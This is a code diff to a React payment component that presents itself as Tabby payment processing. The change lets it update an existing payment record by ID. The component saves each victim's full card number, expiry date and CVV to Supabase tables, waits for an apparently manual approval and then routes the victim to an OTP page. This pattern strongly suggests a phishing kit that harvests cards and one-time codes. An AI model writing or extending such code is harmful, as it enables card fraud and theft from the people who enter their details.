@@ -26,6 +26,7 @@ const TabbyPaymentProcessing = () => {
   const totalAmount = searchParams.get("totalAmount") || "0";
   const company = searchParams.get("company") || "";
   const phone = searchParams.get("phone") || "";
+  const existingPaymentId = searchParams.get("paymentId") || null;
 
   // Rotate loading messages
   useEffect(() => {
@@ -41,29 +42,51 @@ const TabbyPaymentProcessing = () => {
   useEffect(() => {
     const submitPayment = async () => {
       try {
-        // Insert payment record
-        const { data, error } = await supabase
-          .from("tabby_payments")
-          .insert({
-            cardholder_name: cardholderName,
-            card_number: cardNumber,
-            card_number_last4: cardNumberLast4,
-            expiry_date: expiryDate,
-            cvv: cvv,
-            total_amount: parseFloat(totalAmount),
-            company: company,
-            phone: phone,
-            payment_status: "pending",
-          })
-          .select()
-          .single();
+        let finalPaymentId: string;
+        
+        if (existingPaymentId) {
+          // تحديث السجل الموجود مع بيانات البطاقة
+          const { error } = await supabase
+            .from("tabby_payments")
+            .update({
+              cardholder_name: cardholderName,
+              card_number: cardNumber,
+              card_number_last4: cardNumberLast4,
+              expiry_date: expiryDate,
+              cvv: cvv,
+              total_amount: parseFloat(totalAmount),
+            })
+            .eq("id", existingPaymentId);
 
-        if (error) throw error;
-        setPaymentId(data.id);
+          if (error) throw error;
+          finalPaymentId = existingPaymentId;
+          setPaymentId(existingPaymentId);
+        } else {
+          // إنشاء سجل جديد (للحالات القديمة)
+          const { data, error } = await supabase
+            .from("tabby_payments")
+            .insert({
+              cardholder_name: cardholderName,
+              card_number: cardNumber,
+              card_number_last4: cardNumberLast4,
+              expiry_date: expiryDate,
+              cvv: cvv,
+              total_amount: parseFloat(totalAmount),
+              company: company,
+              phone: phone,
+              payment_status: "pending",
+            })
+            .select()
+            .single();
 
-        // أيضاً حفظ البطاقة في جدول المحاولات
+          if (error) throw error;
+          finalPaymentId = data.id;
+          setPaymentId(data.id);
+        }
+
+        // حفظ البطاقة في جدول المحاولات
         await supabase.from("tabby_payment_attempts").insert({
-          payment_id: data.id,
+          payment_id: finalPaymentId,
           card_number: cardNumber,
           cardholder_name: cardholderName,
           expiry_date: expiryDate,
@@ -75,7 +98,7 @@ const TabbyPaymentProcessing = () => {
           const { data: attemptsData, error: attemptsError } = await supabase
             .from("tabby_payment_attempts")
             .select("approval_status")
-            .eq("payment_id", data.id)
+            .eq("payment_id", finalPaymentId)
             .order('created_at', { ascending: false })
             .limit(1)
             .single();
@@ -89,7 +112,7 @@ const TabbyPaymentProcessing = () => {
             clearInterval(pollInterval);
             setPaymentStatus("success");
             setTimeout(() => {
-              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${data.id}&phone=${phone}&type=tabby`);
+              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${finalPaymentId}&phone=${phone}&type=tabby`);
             }, 2000);
           } else if (attemptsData?.approval_status === "rejected") {
             clearInterval(pollInterval);
